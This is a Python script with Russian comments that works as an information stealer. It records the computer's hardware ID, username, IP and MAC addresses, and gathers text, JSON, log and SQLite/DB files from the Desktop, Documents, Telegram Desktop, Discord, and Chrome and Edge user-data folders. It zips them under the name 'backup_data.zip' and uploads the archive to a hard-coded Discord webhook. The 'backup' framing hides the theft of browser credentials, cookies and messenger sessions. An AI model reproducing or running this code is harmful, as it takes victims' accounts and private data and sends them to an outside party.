import os
import json
import uuid
import platform
import getpass
import socket
import zipfile
import requests
from pathlib import Path
import netifaces
from tqdm import tqdm

# --- Discord webhook ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1409293878355427479/hQsh7Hc_i3IUEibUIUHKFqmWTG_sBSis0HsJQInopL94npG7wzcP2tELKI4boplNtroC"
TEMP_ZIP_PATH = os.path.join(os.environ["TEMP"], "backup_data.zip")

# ------------------- Логирование -------------------
def log(msg):
    print(f"[INFO] {msg}")

# ------------------- Сбор системной информации -------------------
def get_system_info():
    log("Сбор системной информации...")
    info = {}
    info["hwid"] = str(uuid.UUID(int=uuid.getnode()))
    info["pc_name"] = platform.node()
    info["username"] = getpass.getuser()
    info["os"] = platform.platform()
    info["architecture"] = platform.architecture()[0]

    ips = []
    macs = []
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                ips.append(addr['addr'])
        if netifaces.AF_LINK in addrs:
            for addr in addrs[netifaces.AF_LINK]:
                macs.append(addr['addr'])
    info["local_ips"] = ips
    info["macs"] = macs
    log(f"Системная информация собрана: {info}")
    return info

# ------------------- Сбор локальных файлов -------------------
def gather_files(base_dirs, extensions=None):
    log("Сканирование файлов...")
    collected_files = []
    for base_dir in base_dirs:
        if os.path.exists(base_dir):
            for root, dirs, files in os.walk(base_dir):
                for file in files:
                    if extensions is None or any(file.lower().endswith(ext) for ext in extensions):
                        collected_files.append(os.path.join(root, file))
    log(f"Найдено файлов: {len(collected_files)}")
    return collected_files

# ------------------- Создание ZIP без дублирования имен -------------------
def create_zip(files, zip_path):
    log("Создание ZIP архива...")
    base_dir = Path(os.environ["USERPROFILE"])
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        for file in tqdm(files, desc="Добавление файлов в архив", unit="файл"):
            try:
                arcname = os.path.relpath(file, base_dir)
                zipf.write(file, arcname=arcname)
            except Exception as e:
                log(f"Не удалось добавить {file}: {e}")
    log("ZIP архив создан.")

# ------------------- Отправка на Discord с прогресс-баром -------------------
def send_to_discord(zip_path, sys_info):
    log("Отправка архива на Discord...")

    # Генератор для tqdm
    class TqdmStream:
        def __init__(self, file_path):
            self.file_path = file_path
            self.file = open(file_path, "rb")
            self.total = os.path.getsize(file_path)
            self.progress = tqdm(total=self.total, unit='B', unit_scale=True, desc='Отправка файла')
        
        def read(self, chunk_size=1024*1024):
            data = self.file.read(chunk_size)
            self.progress.update(len(data))
            return data

        def close(self):
            self.file.close()
            self.progress.close()

    stream = TqdmStream(zip_path)
    content = (
        f"**Собранные данные с ПК**\n"
        f"HWID: {sys_info['hwid']}\n"
        f"Имя ПК: {sys_info['pc_name']}\n"
        f"Пользователь: {sys_info['username']}\n"
        f"OS: {sys_info['os']}"
    )
    files = {"file": ("backup_data.zip", stream, "application/zip")}
    response = requests.post(WEBHOOK_URL, data={"content": content}, files=files)
    stream.close()

    if response.status_code == 200:
        log("Архив успешно отправлен!")
    else:
        log(f"Ошибка при отправке: {response.status_code} - {response.text}")

# ------------------- Основной код -------------------
def main():
    log("Начало работы скрипта...")
    sys_info = get_system_info()

    base_dirs = [
        os.path.expandvars(r"%USERPROFILE%\Desktop"),
        os.path.expandvars(r"%USERPROFILE%\Documents"),
        os.path.expandvars(r"%APPDATA%\Telegram Desktop"),
        os.path.expandvars(r"%APPDATA%\Discord"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
    ]

    files_to_backup = gather_files(base_dirs, extensions=[".txt", ".json", ".log", ".sqlite", ".db"])
    
    log("Начало архивации файлов...")
    create_zip(files_to_backup, TEMP_ZIP_PATH)

    log("Начало отправки на Discord...")
    send_to_discord(TEMP_ZIP_PATH, sys_info)

    # Удаляем ZIP
    try:
        os.remove(TEMP_ZIP_PATH)
        log("Временный архив удален.")
    except Exception as e:
        log(f"Не удалось удалить ZIP: {e}")

    log("Сбор и отправка данных завершены!")

if __name__ == "__main__":
    main()
